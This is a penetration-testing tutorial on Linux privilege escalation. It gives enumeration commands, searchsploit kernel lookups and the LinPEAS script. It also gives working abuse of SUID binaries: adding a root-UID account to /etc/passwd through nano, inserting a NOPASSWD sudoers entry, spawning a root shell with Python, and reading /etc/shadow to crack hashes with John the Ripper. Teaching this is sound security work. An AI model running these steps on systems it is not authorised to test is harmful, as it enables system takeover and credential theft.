Statistically, most organizations are using Windows operating systems on servers and workstations. But if you take a broader look at the complete infrastructure you will also encounter a lot of devices running on Linux. Examples of devices that are very likely to run a Linux operating system are firewalls, routers, VOIP servers, NAS and webservers. These kinds of devices are very critical for a company’s infrastructure with severe consequences when they are compromised.

It happens very often that system administrators in Windows environments overlook the Linux devices for many reasons. One of these reasons is the lack of knowledge about how to maintain Linux systems and how to secure them. This can result in critical Linux devices being the weakest link in the security chain and become a great security threat. Therefore, it is very important as a penetration tester to focus not only on Windows systems because they cover 90% of the company’s devices but also on (critical) Linux systems.

The most common ways of privilege escalation on Linux systems are leveraging kernel vulnerabilities, misconfigurations and vulnerable software to execute arbitrary code under root privileges. New kernel vulnerabilities occur on a regular basis and often involve a wide range of kernel versions. A recently discovered example of a kernel vulnerability allowing for privilege escalation is the DirtyCOW vulnerability affecting hundreds of Linux kernel versions. Also misconfigurations in files, services and security mechanisms and out of date software commonly allow for privilege escalation.

-- Gather system information for privilege escalation --

Services running with root privileges are of especial interest for privilege escalation. When we can exploit a service running as root to execute arbitrary commands they will be executed as root. Applications that are configured to be executed with higher privileges using a Linux feature named SUID are also very useful.

For effective privilege escalation in Linux the system information you should know includes:

• Distribution type
• Kernel version
• Running applications and services
• Weak file permissions
• Scheduled jobs
• Other important information about the system.


-- Collecting system information manually --

➜ OS, Kernel & Hostname

cat /etc/issue
cat /proc/version
cat /etc/centos-release
hostname
uname -a

⇒ On Exploit-db or with searchsploit: 

searchsploit linux kernel 3.9
searchsploit --exclude="/dos/" "linux kernel 3.9"

Google Search: CentOS 7.0.1406 privilege escalation

Search Exploit-DB on the kernel version from narrow to wide with the ‘local’ filter to ensure the exploits are local exploits only. 

Linux kernel 3.10.0-123 // No results.
Linux kernel 3.10.0     // 1 local exploit matching the kernel version.
Linux kernel 3.10       // No results that match the CentOS 7 operating system.

-- Users --

The passwd file stores essential user account information required during login. The passwd file is stored in the /etc directory and contains information such as the user ID, group ID, home directory and the path to the command shell. An ‘x’ character means that the encrypted password is stored in the /etc/shadow file.

cat /etc/passwd

Make sure you pay attention to the groups to which the privileged user belongs. One especially important group is the sudo (‘Super User Do’) group. A user that is member of the sudo group is able to execute commands in the context of the root user without providing the root password – depending on the settings in the sudoer file you may only need to enter the password for the current user or none at all.

id
who
w
sudo -l

useraccount ALL=/usr/bin/apt-get,/sbin/shutdown


-- Networking information --

ifconfig -a
route
netstat -antup
arp -e


-- Applications and services --

Knowing which services are running with root privileges can be very important for privilege escalation because exploiting them will result in root level access.

Joomla installations contain a configuration file named 'configuration.php' and WordPress uses the 'wp-config.php' file for this purpose. 
These configuration files contain valuable information such as the MySQL username and password.

ps aux
ps aux | grep

Debian and derivatives use: dpkg -l
Fedora based distros use: rpm -qa

ls -ls /etc/ | grep .conf
ls -ls /var/www/html/

find /* -user root -perm -4000 -print 2>/dev/null


-- Files and file systems --

⇒ Check for unmounted file systems

cat /etc/fstab

mount | column -t
awk '$1 !~ /^#/ && $1 != "" {print $1, $2, $3}' /etc/fstab
grep -i cifs /etc/fstab

⇒ Find files and directories that have world writable permissions

find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root
find / \( -wholename '/home/homedir/*' -prune -o -wholename  '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';'  2>/dev/null

find /etc -perm -2 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
getcap -r / 2>/dev/null


-- Automated Scripts --

Automated vulnerability scanners and scripts usually rely on a database of known vulnerabilities which is only as valid as the last update.
Another limitation of scripts is that they are generally considered ‘dumb’. They are programmed only to perform a given series of checks and nothing more.

➜ LinPEAS – Linux Privilege Escalation Awesome Script 

An interesting thing to note here is the legend printed at the top of the script output which indicates the colours that are used to mark important output. In the output that follows it is important to pay special attention to the red and red/yellow text which mark privilege escalation vectors and important things we must look at.

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

./linpeas.sh -h
./linpeas.sh

➜ Linux privilege escalation checker

The result of this script is a list of local privilege escalation exploits that may apply to the system.

-- Exploiting SUID Permissions --

• Nano
• Python
• Cat

➜ Nano

SUID stands for ‘set user ID‘ and is a Linux feature that allows low privileged users to execute a file as the file owner.

chmod u+s /bin/nano

find /* -user root -perm -4000 -print 2>/dev/null
ls -ls | grep nano
nano /etc/passwd

perl -e 'print crypt("YourPasswd", "salt"),"\n"'
perl -e 'print crypt("pom", "pom"),"\n"'
pom:poD7u2nSiBSLk:0:0:root:/root:/bin/bash
su pom

The passwd file is a text-based database of user records and is located in the /etc directory. 
root:x:0:0:root:/root:/bin/bash

/ETC/PASSWD FILE EXPLAINED
==========================

root:x:0:0:root:/root:/bin/bash
|   | | | |    |     |        |
|   | | | |    |     |        +----- 7. Command-line shell
|   | | | |    |     +-------------- 6. Home directory path
|   | | | |    +-------------------- 5. GECOS field (user info)
|   | | | +------------------------- 4. Group identifier (GID)
|   | | +--------------------------- 3. User identifier (UID)
|   | +----------------------------- 2. Password placeholder
|   +------------------------------- 1. Username


1. Username.
2. Password. The ‘x’ means that the actual password is stored in the shadow password file. You can replace the x with a cryptographic hash from the password and a salt.
3. User identifier.
4. Group identifier, contains the primary user group.
5. Gecos field, a user record containing information about the user such as the full name.
6. Path to the home directory.
7. Command line shell when the user logs in.

⇒ Modify the sudoers file and give the current privileged user (in this example user sam) permission to execute sudo commands without a password

/etc/sudoers

Defaults    env_reset
Defaults    mail_badpass
Defaults    secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification
# User alias specification
# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL
sam     ALL=(ALL:ALL) NOPASSWD:ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "@include" directives:
@includedir /etc/sudoers.d

sudo id

➜ Python

find /usr/bin/* -user root -perm -4000 -print 2>/dev/null
/usr/bin/python2.7
/usr/bin/python3.9

/usr/bin/python3.9 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

➜ Cat

Read access as root can be used for privilege escalation, for example to read files that are only accessible by root. A good example of such a file is /etc/shadow, a file that stores actual passwords in an encrypted format.
In the /etc/shadow file we find a couple users with encrypted passwords, which is the root user and sam.

find /usr/bin/* -user root -perm -4000 -print 2>/dev/null
cat /etc/shadow

cat /etc/passwd | grep -E "root:x:|sam:x:" > passwd.txt
cat /etc/shadow | grep -E "root:|sam:" > shadow.txt

unshadow passwd.txt shadow.txt > unshadowed.txt

john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt


-- Exploiting SGID permissions --

The set-group identification (SGID) permission is similar to the SUID permission except that it applies to groups instead of users.
On the GTFOBins website you can find an overview of all Unix binaries that can be used to bypass local security restrictions in misconfigured systems. 

find / -type d -perm -02000
